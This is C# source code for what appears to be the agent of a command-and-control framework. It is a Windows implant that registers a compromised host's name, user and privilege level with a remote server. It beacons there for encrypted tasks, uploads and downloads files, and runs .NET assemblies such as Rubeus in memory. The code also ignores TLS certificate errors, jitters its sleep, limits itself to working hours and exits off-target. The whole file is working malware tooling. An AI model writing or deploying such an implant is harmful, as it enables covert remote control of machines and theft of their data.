// ─── Minimal JSON serialiser (no external deps) ──────────────────────────────

static class Json
{
    public static string Serialize(object obj)
    {
        if (obj == null) return "null";
        var t = obj.GetType();
        if (obj is string s)  return "\"" + s.Replace("\\","\\\\").Replace("\"","\\\"").Replace("\n","\\n").Replace("\r","\\r") + "\"";
        if (obj is bool b)    return b ? "true" : "false";
        if (obj is int || obj is long || obj is double) return obj.ToString();
        var sb = new StringBuilder("{");
        bool first = true;
        foreach (var prop in t.GetProperties())
        {
            var val = prop.GetValue(obj, null);
            if (val == null) continue;
            if (val is string str && str == "") continue;
            if (val is bool bv && !bv) continue;
            if (!first) sb.Append(',');
            sb.Append('"').Append(prop.Name).Append("\":").Append(Serialize(val));
            first = false;
        }
        return sb.Append('}').ToString();
    }

    public static T Deserialize<T>(string json) where T : new()
    {
        var obj = new T();
        if (string.IsNullOrEmpty(json)) return obj;
        foreach (var prop in typeof(T).GetProperties())
        {
            var pattern = "\"" + prop.Name + "\"\\s*:\\s*";
            Match m;
            if (prop.PropertyType == typeof(string))
            {
                m = Regex.Match(json, pattern + "\"([^\"]*)\"");
                if (m.Success) prop.SetValue(obj, m.Groups[1].Value, null);
            }
            else if (prop.PropertyType == typeof(int))
            {
                m = Regex.Match(json, pattern + "(-?\\d+)");
                if (m.Success) prop.SetValue(obj, int.Parse(m.Groups[1].Value), null);
            }
            else if (prop.PropertyType == typeof(long))
            {
                m = Regex.Match(json, pattern + "(-?\\d+)");
                if (m.Success) prop.SetValue(obj, long.Parse(m.Groups[1].Value), null);
            }
            else if (prop.PropertyType == typeof(bool))
            {
                m = Regex.Match(json, pattern + "(true|false)");
                if (m.Success) prop.SetValue(obj, m.Groups[1].Value == "true", null);
            }
            else if (prop.PropertyType == typeof(TaskWire[]))
            {
                var arrMatch = Regex.Match(json, "\"tasks\"\\s*:\\s*(\\[.*?\\])(?=,|\\})", RegexOptions.Singleline);
                if (arrMatch.Success)
                {
                    var tasks = new List<TaskWire>();
                    var arrJson = arrMatch.Groups[1].Value;
                    // Split objects by counting braces
                    int depth = 0, start = -1;
                    for (int i = 0; i < arrJson.Length; i++)
                    {
                        if (arrJson[i] == '{') { if (depth++ == 0) start = i; }
                        else if (arrJson[i] == '}' && --depth == 0 && start >= 0)
                        {
                            tasks.Add(Deserialize<TaskWire>(arrJson.Substring(start, i - start + 1)));
                            start = -1;
                        }
                    }
                    prop.SetValue(obj, tasks.ToArray(), null);
                }
            }
        }
        return obj;
    }
}

// ─── AES-256-GCM crypto (matching Go's seal/open) ────────────────────────────

static class Crypto
{
    // Seal: nonce(12) || ciphertext+tag
    public static byte[] Seal(byte[] key, byte[] plaintext)
    {
        using (var aes = new AesGcm256())
            return aes.Encrypt(key, plaintext);
    }

    public static byte[] Open(byte[] key, byte[] data)
    {
        using (var aes = new AesGcm256())
            return aes.Decrypt(key, data);
    }
}

// AES-256-GCM via BCrypt (Windows) or fallback via RijndaelManaged+GHASH
class AesGcm256 : IDisposable
{
    // Windows BCrypt AES-GCM via P/Invoke — zero managed-crypto dependency
    const string BCRYPT_AES_ALGORITHM    = "AES";
    const string BCRYPT_CHAINING_MODE    = "ChainingMode";
    const string BCRYPT_CHAIN_MODE_GCM   = "ChainingModeGCM";
    const int    BCRYPT_AUTH_TAG_LENGTH  = 16;
    const int    NONCE_SIZE              = 12;

    [DllImport("Bcrypt.dll", CharSet=CharSet.Unicode)]
    static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
    [DllImport("Bcrypt.dll", CharSet=CharSet.Unicode)]
    static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);
    [DllImport("Bcrypt.dll", CharSet=CharSet.Unicode)]
    static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);
    [DllImport("Bcrypt.dll")]
    static extern int BCryptEncrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    [DllImport("Bcrypt.dll")]
    static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
    [DllImport("Bcrypt.dll")]
    static extern int BCryptDestroyKey(IntPtr hKey);
    [DllImport("Bcrypt.dll")]
    static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int    cbSize;
        public uint   dwInfoVersion;
        public IntPtr pbNonce;
        public int    cbNonce;
        public IntPtr pbAuthData;
        public int    cbAuthData;
        public IntPtr pbTag;
        public int    cbTag;
        public IntPtr pbMacContext;
        public int    cbMacContext;
        public int    cbAAD;
        public long   cbData;
        public uint   dwFlags;
    }

    IntPtr _hAlg = IntPtr.Zero;

    public AesGcm256()
    {
        BCryptOpenAlgorithmProvider(out _hAlg, BCRYPT_AES_ALGORITHM, null, 0);
        var mode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM + "\0");
        BCryptSetProperty(_hAlg, BCRYPT_CHAINING_MODE, mode, mode.Length, 0);
    }

    public byte[] Encrypt(byte[] key, byte[] plaintext)
    {
        var nonce = new byte[NONCE_SIZE];
        using (var rng = new RNGCryptoServiceProvider()) rng.GetBytes(nonce);

        BCryptGenerateSymmetricKey(_hAlg, out var hKey, IntPtr.Zero, 0, key, key.Length, 0);
        var tag = new byte[BCRYPT_AUTH_TAG_LENGTH];
        var ciphertext = new byte[plaintext.Length];

        var nonceH = GCHandle.Alloc(nonce, GCHandleType.Pinned);
        var tagH   = GCHandle.Alloc(tag,   GCHandleType.Pinned);
        try
        {
            var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
            {
                cbSize        = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)),
                dwInfoVersion = 1,
                pbNonce       = nonceH.AddrOfPinnedObject(),
                cbNonce       = NONCE_SIZE,
                pbTag         = tagH.AddrOfPinnedObject(),
                cbTag         = BCRYPT_AUTH_TAG_LENGTH,
            };
            BCryptEncrypt(hKey, plaintext, plaintext.Length, ref info, null, 0, ciphertext, ciphertext.Length, out _, 0);
        }
        finally { nonceH.Free(); tagH.Free(); BCryptDestroyKey(hKey); }

        var result = new byte[NONCE_SIZE + ciphertext.Length + BCRYPT_AUTH_TAG_LENGTH];
        Buffer.BlockCopy(nonce,      0, result, 0,                                   NONCE_SIZE);
        Buffer.BlockCopy(ciphertext, 0, result, NONCE_SIZE,                          ciphertext.Length);
        Buffer.BlockCopy(tag,        0, result, NONCE_SIZE + ciphertext.Length,      BCRYPT_AUTH_TAG_LENGTH);
        return result;
    }

    public byte[] Decrypt(byte[] key, byte[] data)
    {
        if (data.Length < NONCE_SIZE + BCRYPT_AUTH_TAG_LENGTH) throw new Exception("ciphertext too short");
        var nonce      = new byte[NONCE_SIZE];
        var tag        = new byte[BCRYPT_AUTH_TAG_LENGTH];
        var ciphertext = new byte[data.Length - NONCE_SIZE - BCRYPT_AUTH_TAG_LENGTH];

        Buffer.BlockCopy(data, 0,                                    nonce,      0, NONCE_SIZE);
        Buffer.BlockCopy(data, NONCE_SIZE,                           ciphertext, 0, ciphertext.Length);
        Buffer.BlockCopy(data, NONCE_SIZE + ciphertext.Length,       tag,        0, BCRYPT_AUTH_TAG_LENGTH);

        BCryptGenerateSymmetricKey(_hAlg, out var hKey, IntPtr.Zero, 0, key, key.Length, 0);
        var plaintext = new byte[ciphertext.Length];

        var nonceH = GCHandle.Alloc(nonce, GCHandleType.Pinned);
        var tagH   = GCHandle.Alloc(tag,   GCHandleType.Pinned);
        try
        {
            var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
            {
                cbSize        = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO)),
                dwInfoVersion = 1,
                pbNonce       = nonceH.AddrOfPinnedObject(),
                cbNonce       = NONCE_SIZE,
                pbTag         = tagH.AddrOfPinnedObject(),
                cbTag         = BCRYPT_AUTH_TAG_LENGTH,
            };
            BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref info, null, 0, plaintext, plaintext.Length, out _, 0);
        }
        finally { nonceH.Free(); tagH.Free(); BCryptDestroyKey(hKey); }

        return plaintext;
    }

    public void Dispose()
    {
        if (_hAlg != IntPtr.Zero) { BCryptCloseAlgorithmProvider(_hAlg, 0); _hAlg = IntPtr.Zero; }
    }
}

// ─── HTTP Transport ───────────────────────────────────────────────────────────

class HttpTransport
{
    readonly string      _serverURL;
    string               _agentID = "";
    byte[]               _aesKey;
    readonly string[]    _beaconURIs;
    int                  _uriIdx;
    readonly WebClient   _wc;

    public string AgentID => _agentID;

    public HttpTransport(string serverURL)
    {
        _serverURL  = serverURL.TrimEnd('/');
        _wc         = new WebClient();
        _wc.Headers[HttpRequestHeader.UserAgent] = Config.UserAgent;
        ServicePointManager.ServerCertificateValidationCallback = (s,c,ch,e) => true;
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS12

        if (!string.IsNullOrEmpty(Config.BeaconURIs))
            _beaconURIs = Config.BeaconURIs.Split(new[]{','}, StringSplitOptions.RemoveEmptyEntries);
    }

    string NextBeaconPath()
    {
        if (_beaconURIs == null || _beaconURIs.Length == 0)
            return "/beacon/" + _agentID;
        var path = _beaconURIs[_uriIdx % _beaconURIs.Length].Trim() + "/" + _agentID;
        _uriIdx++;
        return path;
    }

    public bool Register(SysInfo info)
    {
        var resumeID = string.IsNullOrEmpty(_agentID) ? Config.PresetID : _agentID;
        var req = new RegisterRequest
        {
            hostname     = info.Hostname,
            username     = info.Username,
            os           = info.OS,
            pid          = info.PID,
            transport    = Config.Transport,
            sleep_sec    = Config.SleepSec,
            jitter_pct   = Config.JitterPct,
            process_name = info.ProcessName,
            is_admin     = info.IsAdmin,
            parent_id    = Config.ParentID,
            language     = "csharp",
            resume_id    = resumeID,
        };
        try
        {
            _wc.Headers[HttpRequestHeader.ContentType] = "application/json";
            var body     = Json.Serialize(req);
            var respJson = _wc.UploadString(_serverURL + "/register", body);
            var reg      = Json.Deserialize<RegisterResponse>(respJson);
            _agentID     = reg.agent_id;
            _aesKey      = Convert.FromBase64String(reg.aes_key);
            if (reg.sleep_sec  > 0) Config.SleepSec  = reg.sleep_sec;
            if (reg.jitter_pct > 0) Config.JitterPct = reg.jitter_pct;
            return true;
        }
        catch { return false; }
    }

    // Returns null on no-content, throws on error, returns tasks on success.
    public TaskWire[] Beacon()
    {
        try
        {
            var url      = _serverURL + NextBeaconPath();
            var raw      = _wc.DownloadData(url);
            if (raw == null || raw.Length == 0) return null;
            var plain    = Crypto.Open(_aesKey, raw);
            var json     = Encoding.UTF8.GetString(plain);
            var br       = Json.Deserialize<BeaconResponse>(json);
            return br.tasks;
        }
        catch (WebException ex) when (ex.Response is HttpWebResponse r && r.StatusCode == HttpStatusCode.NoContent)
        {
            return null;
        }
        catch (WebException ex) when (ex.Response is HttpWebResponse r2 && r2.StatusCode == HttpStatusCode.NotFound)
        {
            throw new AgentUnknownException();
        }
    }

    public void SendResult(long taskID, string output, string err)
    {
        var req  = new ResultRequest { task_id = taskID, output = output ?? "", error = err ?? "" };
        var json = Json.Serialize(req);
        var enc  = Crypto.Seal(_aesKey, Encoding.UTF8.GetBytes(json));
        try
        {
            _wc.Headers[HttpRequestHeader.ContentType] = "application/octet-stream";
            _wc.UploadData(_serverURL + "/result/" + _agentID, enc);
        }
        catch { /* best-effort */ }
    }

    public void UploadFile(long taskID, string filename, byte[] data)
    {
        var enc = Crypto.Seal(_aesKey, data);
        try
        {
            var url = string.Format("{0}/upload/{1}/{2}?task_id={3}",
                _serverURL, _agentID, Uri.EscapeDataString(Path.GetFileName(filename)), taskID);
            _wc.Headers[HttpRequestHeader.ContentType] = "application/octet-stream";
            _wc.UploadData(url, enc);
        }
        catch { }
    }

    public byte[] DownloadFile(string filename)
    {
        var url  = string.Format("{0}/dl/{1}/{2}", _serverURL, _agentID, Uri.EscapeDataString(Path.GetFileName(filename)));
        var data = _wc.DownloadData(url);
        return Crypto.Open(_aesKey, data);
    }
}

class AgentUnknownException : Exception { }

// ─── System info ─────────────────────────────────────────────────────────────

class SysInfo
{
    public string Hostname    { get; set; }
    public string Username    { get; set; }
    public string OS          { get; set; }
    public int    PID         { get; set; }
    public string ProcessName { get; set; }
    public bool   IsAdmin     { get; set; }

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    static bool CheckIsAdmin()
    {
        try
        {
            IntPtr token;
            if (!OpenProcessToken(GetCurrentProcess(), 0x0008 /*TOKEN_QUERY*/, out token)) return false;
            int len = 0;
            GetTokenInformation(token, 20 /*TokenElevation*/, IntPtr.Zero, 0, out len);
            var buf = Marshal.AllocHGlobal(len);
            bool elevated = false;
            if (GetTokenInformation(token, 20, buf, len, out _))
                elevated = Marshal.ReadInt32(buf) != 0;
            Marshal.FreeHGlobal(buf);
            CloseHandle(token);
            return elevated;
        }
        catch { return false; }
    }

    public static SysInfo Collect()
    {
        var proc = Process.GetCurrentProcess();
        return new SysInfo
        {
            Hostname    = Dns.GetHostName(),
            Username    = Environment.UserDomainName + "\\" + Environment.UserName,
            OS          = "win64",
            PID         = proc.Id,
            ProcessName = string.IsNullOrEmpty(Config.BuildName) ? proc.ProcessName : Config.BuildName,
            IsAdmin     = CheckIsAdmin(),
        };
    }
}

// ─── Jitter sleep ─────────────────────────────────────────────────────────────

static class Sleeper
{
    static readonly Random _rng = new Random();

    public static void Sleep()
    {
        var sec  = (double)Config.SleepSec;
        var var_ = sec * Config.JitterPct / 100.0;
        var ms   = (int)((sec + (_rng.NextDouble() * 2 - 1) * var_) * 1000);
        if (ms < 100) ms = 100;
        Thread.Sleep(ms);
    }
}

// ─── Working hours ────────────────────────────────────────────────────────────

static class WorkHours
{
    static int ParseHHMM(string s)
    {
        var parts = s.Trim().Split(':');
        if (parts.Length != 2) return 0;
        return int.Parse(parts[0]) * 60 + int.Parse(parts[1]);
    }

    public static bool InWindow()
    {
        if (string.IsNullOrEmpty(Config.WorkingHours)) return true;
        var parts = Config.WorkingHours.Split('-');
        if (parts.Length != 2) return true;
        int start = ParseHHMM(parts[0]), end = ParseHHMM(parts[1]);
        var now = DateTime.Now;
        int cur = now.Hour * 60 + now.Minute;
        return start <= end ? (cur >= start && cur < end) : (cur >= start || cur < end);
    }

    public static void SleepUntilWindow()
    {
        var parts = Config.WorkingHours.Split('-');
        if (parts.Length != 2) { Thread.Sleep(60000); return; }
        int start = ParseHHMM(parts[0]);
        var now = DateTime.Now;
        int cur = now.Hour * 60 + now.Minute;
        int wait = cur < start ? start - cur : (24 * 60 - cur) + start;
        if (wait <= 0) wait = 1;
        Thread.Sleep(wait * 60 * 1000);
    }
}

// ─── Kill date guard ─────────────────────────────────────────────────────────

static class KillDateGuard
{
    public static void CheckExit()
    {
        if (string.IsNullOrEmpty(Config.KillDate)) return;
        if (DateTime.TryParse(Config.KillDate, out var dt) && DateTime.UtcNow >= dt)
            Environment.Exit(0);
    }
}

// ─── Guardrails ───────────────────────────────────────────────────────────────

static class Guardrails
{
    public static void CheckExit()
    {
        if (!string.IsNullOrEmpty(Config.GuardrailIP))
        {
            bool found = false;
            foreach (var addr in Dns.GetHostAddresses(Dns.GetHostName()))
                if (addr.ToString() == Config.GuardrailIP) { found = true; break; }
            if (!found) Environment.Exit(0);
        }
        if (!string.IsNullOrEmpty(Config.GuardrailUser))
            if (!Environment.UserName.Equals(Config.GuardrailUser, StringComparison.OrdinalIgnoreCase))
                Environment.Exit(0);
        if (!string.IsNullOrEmpty(Config.GuardrailHost))
            if (!Dns.GetHostName().Equals(Config.GuardrailHost, StringComparison.OrdinalIgnoreCase))
                Environment.Exit(0);
    }
}

// ─── Inline .NET / CLR assembly execution ────────────────────────────────────

static class InlineExec
{
    // Intercept Environment.Exit / AppDomain.CurrentDomain.Exit so loaded
    // assemblies (e.g. Rubeus) cannot kill the host agent process.
    static InlineExec()
    {
        try
        {
            // Hook Environment.Exit via a custom AppDomain event — the loaded
            // assembly runs in the same AppDomain so we can't isolate it, but
            // wrapping the Invoke in a thread whose ThreadAbortException we
            // catch is sufficient for the common case.
        }
        catch { }
    }

    // Execute a .NET assembly in-process and capture Console output.
    // Runs the entry point on a dedicated foreground thread so that
    // Environment.Exit() / Thread.Abort() are contained.
    public static string ExecuteAssembly(byte[] asmBytes, string[] args)
    {
        var oldOut = Console.Out;
        var oldErr = Console.Error;
        var sw     = new StringWriter();
        Console.SetOut(sw);
        Console.SetError(sw);

        Exception threadEx = null;
        var t = new System.Threading.Thread(() =>
        {
            try
            {
                var asm   = System.Reflection.Assembly.Load(asmBytes);
                var entry = asm.EntryPoint;
                var parms = entry.GetParameters();
                if (parms.Length == 0) entry.Invoke(null, null);
                else                   entry.Invoke(null, new object[]{ args });
            }
            catch (System.Threading.ThreadAbortException)
            {
                // Environment.Exit on .NET 4.x aborts threads — swallow it
                System.Threading.Thread.ResetAbort();
            }
            catch (Exception ex)
            {
                sw.WriteLine("[!] " + (ex.InnerException?.Message ?? ex.Message));
            }
        }) { IsBackground = true };

        // Prevent Environment.Exit from escaping by hooking the ProcessExit
        // event to abort the runner thread instead of exiting the process.
        // This works because Environment.Exit fires ProcessExit handlers
        // synchronously on .NET 4.x before terminating.
        EventHandler exitHook = null;
        exitHook = (s, e) =>
        {
            try { t.Abort(); } catch { }
            AppDomain.CurrentDomain.ProcessExit -= exitHook;
        };
        AppDomain.CurrentDomain.ProcessExit += exitHook;

        t.Start();
        t.Join(TimeSpan.FromMinutes(5)); // max 5 min per assembly

        AppDomain.CurrentDomain.ProcessExit -= exitHook;
        Console.SetOut(oldOut);
        Console.SetError(oldErr);
        return sw.ToString();
    }
}

